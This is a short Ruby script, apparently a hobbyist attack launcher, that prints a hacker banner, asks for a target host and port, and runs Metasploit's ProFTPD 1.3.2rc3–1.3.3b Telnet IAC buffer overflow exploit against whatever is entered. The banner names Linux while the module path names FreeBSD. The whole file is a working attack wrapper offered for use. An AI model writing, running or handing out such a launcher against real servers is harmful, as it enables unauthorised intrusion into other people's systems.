require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
   ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
	               Automatic Targeting
""".red
puts """
          Automatic Target Port 21
""".white
   

puts " [?] What is the target? ".blue
print "[!] ---> ".white

target = gets.chomp

puts " [?] What is the port? [Default 21] ".blue
print " [!] ---> ".yellow

port = gets.chomp

exec("msfconsole -x 'use exploit/freebsd/ftp/proftp_telnet_iac' -x 'setg RHOST #{target}'  -x 'setg RPORT #{port}' -x 'run'")

